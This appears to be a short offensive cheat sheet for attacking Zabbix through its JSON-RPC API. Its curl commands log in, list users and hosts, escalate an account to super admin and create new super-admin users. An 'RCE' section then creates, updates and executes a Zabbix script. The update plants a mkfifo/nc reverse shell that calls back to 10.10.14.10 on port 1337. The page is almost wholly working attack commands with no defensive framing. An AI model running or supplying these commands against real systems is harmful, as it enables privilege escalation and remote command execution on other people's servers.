---
title: "Zabbix"
date: 2024-7-8
tags: ["zabbix", "api", "monitoring"]
---

### Zabbix API

#### General

<div>

```console
# Auth with cred
curl http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "<USER>", "password": "<PASSWORD>"}}'
```

```console
# Get users
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"<AUTH>", "params":{"output": "extend"}}' | jq .
```

```console
# Get hosts
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"<AUTH>", "params":{}}' | jq .
```

```console
# Get user group info
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.get", "id":1, "auth":"<AUTH>", "params":{"userids": "1"}}' | jq '.'
```

```console
# Update user group info (e.g. gui_access)
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.update", "id":1, "auth":"<AUTH>", "params":{"usrgrpid": "12", "gui_access": "0"}}' | jq -c '.'
```

```console
# Update user (e.g. change user to super admin)
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"<AUTH>", "params":{"userid": "2", "type": "3"}}' | jq -c '.'
```

```console
# Create user (e.g. with role super admin)
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.create", "id":1, "auth":"<AUTH>", "params":{"passwd": "<PASSWORD>", "usrgrps": [{"usrgrpid": "7"}], "alias": "<USER>", "type": "3"}}' | jq -c '.'
```

</div>

#### RCE

<div>

```console
# Create script on container 0 (default 1)
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"<AUTH>", "params":{"command": "id", "name": "test", "execute_on": 0}}' | jq .
```

```console
# Update script
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"<AUTH>", "params":{"scriptid": 4, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1337 >/tmp/f"}}' | jq -c .
```

```console
# Execute script (e.g. scriptid 4)
curl -s http://<DOMAIN>/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"<AUTH>", "params":{"hostid": 10106, "scriptid": 4}}' | jq .
```

</div>

<br>